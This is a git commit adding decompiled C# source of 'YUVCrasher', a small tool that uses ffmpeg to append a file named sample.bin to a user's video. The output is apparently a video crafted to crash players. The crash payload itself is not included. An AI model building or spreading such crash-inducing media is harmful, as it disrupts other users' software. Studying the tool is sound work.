43be57075246473c8a31a5cad4e5fc598f830b85
D3XX3R <koray@d3xx3r.de>
2021-01-04 21:15:41 +0100

    Added from dotPeek extracted source code

---
+++ AssemblyInfo.cs
@@ -0,0 +1,14 @@
+﻿using System.Reflection;
+using System.Runtime.InteropServices;
+
+[assembly: AssemblyTitle("YUVCrasher")]
+[assembly: AssemblyDescription("")]
+[assembly: AssemblyConfiguration("")]
+[assembly: AssemblyCompany("")]
+[assembly: AssemblyProduct("YUVCrasher")]
+[assembly: AssemblyCopyright("Copyright ©  2020")]
+[assembly: AssemblyTrademark("")]
+[assembly: ComVisible(false)]
+[assembly: Guid("6505266f-03dd-4dce-bc14-cf8357ff8830")]
+[assembly: AssemblyFileVersion("1.0.0.0")]
+[assembly: AssemblyVersion("1.0.0.0")]
---
+++ Program.cs
@@ -0,0 +1,46 @@
+﻿// Decompiled with JetBrains decompiler
+// Type: YUVCrasher.Program
+// Assembly: YUVCrasher, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
+// MVID: 6216E6B9-C7A1-4996-B1E3-D99BFA1C30C2
+// Assembly location: C:\Users\koray\Downloads\Compressed\YUVCrasher-v101\YUVCrasher.exe
+
+using System;
+using System.Diagnostics;
+using System.IO;
+
+namespace YUVCrasher
+{
+  internal class Program
+  {
+    private static void Main(string[] args)
+    {
+      try
+      {
+        Console.Title = "YUVCrasher | Made by Emlin#0505";
+        if (args.Length < 1)
+        {
+          Console.WriteLine("Usage: " + Process.GetCurrentProcess().MainModule.FileName + " *videofile*");
+          Console.ReadKey();
+        }
+        else
+        {
+          File.WriteAllText("join.txt", "file '" + args[0] + "'\nfile sample.bin");
+          Process process = new Process();
+          process.StartInfo.UseShellExecute = false;
+          process.StartInfo.RedirectStandardOutput = true;
+          process.StartInfo.FileName = "ffmpeg.exe";
+          process.StartInfo.Arguments = " -y -f concat -safe 0 -i join.txt -codec copy output.mp4";
+          process.Start();
+          Console.WriteLine(process.StandardOutput.ReadToEnd());
+          process.WaitForExit();
+          File.Delete("join.txt");
+        }
+      }
+      catch (Exception ex)
+      {
+        Console.WriteLine("Error: " + ex.Message);
+        Console.ReadKey();
+      }
+    }
+  }
+}
